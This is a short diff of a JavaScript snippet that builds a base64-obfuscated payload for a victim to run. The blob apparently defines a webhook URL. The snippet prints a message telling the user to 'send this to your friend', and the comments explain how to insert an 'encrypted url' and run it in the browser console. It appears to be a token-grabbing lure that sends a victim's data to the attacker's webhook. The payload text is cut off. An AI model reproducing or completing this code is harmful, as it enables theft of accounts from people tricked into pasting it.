@@ -2,4 +2,4 @@ var tosend=`var url='put your encrypted url here';var e="Y29uc3Qgd2ViaG9va3VybCA
 console.clear();
 console.log("send this to your friend ' "+ tosend +" '")
 //the decrypted code was made by REZIZT1337!
-//you need to execute to get the encrypted version of all
+//execute this code in the console, put your encrypted url after url='
